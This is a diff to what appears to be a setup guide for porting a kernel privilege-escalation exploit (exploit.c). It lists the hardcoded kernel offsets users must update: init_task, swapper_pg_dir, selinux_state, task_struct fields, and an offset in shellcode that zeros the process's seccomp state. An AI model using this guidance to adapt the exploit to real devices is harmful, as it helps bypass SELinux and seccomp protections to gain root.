@@ -65,9 +65,17 @@ This will output something like:
 ```
 === Update exploit.c with these values ===
 
-Line 677: swapper_pg_dir_off = idmap_pg_dir_off + 0x5000;
-Line 680: uint64_t init_task_off = idmap_pg_dir_off + 0x321f80;
-Line 1412: uint64_t selinux_state_offset = 0x5c4b88;
+Line 652: #define IDMAP_PG_DIR_OFFSET 0x245a000
+Line 958: #define DEFAULT_KERNEL_SIZE_MB 43
+
+Line 693: swapper_pg_dir_off = idmap_pg_dir_off + 0x5000;
+Line 1448: uint64_t idmap_pg_dir_phys = ctx->swapper_pg_dir_phys - 0x5000;
+Line 696: uint64_t init_task_off = idmap_pg_dir_off + 0x321f80;
+Line 707: swapper_pg_dir_off = fallback_idmap_pg_dir_off + 0x5000;
+Line 708: uint64_t init_task_off = fallback_idmap_pg_dir_off + 0x321f80;
+Line 723: swapper_pg_dir_off = fallback_idmap_pg_dir_off + 0x5000;
+Line 724: uint64_t init_task_off = fallback_idmap_pg_dir_off + 0x321f80;
+Line 1455: uint64_t selinux_state_offset = 0x5c4b88;
 
 helpers/analyze.c:
 #define PHYS_ADDR 0x140ca4   // __do_sys_capset - _text
@@ -117,9 +125,10 @@ Line 122: #define OFFSETOF_TASK_STRUCT_MM 0x518
 Line 123: #define OFFSETOF_MM_PGD 0x48
 
 Hardcoded offsets in exploit.c:
-Line 1055, 1065: task_struct->tasks = 0x4c8
-Line 1069: task_struct->pid = 0x5c8
-Line (seccomp shellcode): task_struct->seccomp = 0x848
+Line 1098, 1108: task_struct->tasks = 0x4c8
+Line 1112: task_struct->pid = 0x5c8
+Line 1724 (seccomp shellcode): task_struct->seccomp = 0x848
+Line 1725 (seccomp shellcode): task_struct->seccomp.filter = 0x850
 ```
 
 **Update the specified lines in `exploit.c` with these values.**
@@ -128,10 +137,9 @@ Line (seccomp shellcode): task_struct->seccomp = 0x848
 
 The script identifies the lines, but you need to manually update:
 
-- **Line 1055**: `uint64_t init_task_tasks_phys = cheese->init_task_phys + 0x4c8;`
-- **Line 1065**: `uint64_t current_task_phys = current_tasks_member_phys - 0x4c8;`
-- **Line 1069**: `uint64_t pid_addr = current_task_phys + 0x5c8;`
-- **Seccomp shellcode**: Update the offset in shellcode that zeros seccomp structure (currently `0x848`)
+- **Line 123**: `#define OFFSETOF_TASK_STRUCT_MM 0x518`
+- **Line 124**: `#define OFFSETOF_MM_PGD 0x48`
+- **task_struct offsets**: Search for and update task_struct->tasks, ->pid, ->seccomp offsets in the task iteration code
 
 ## Step 7: Compile and Test
 
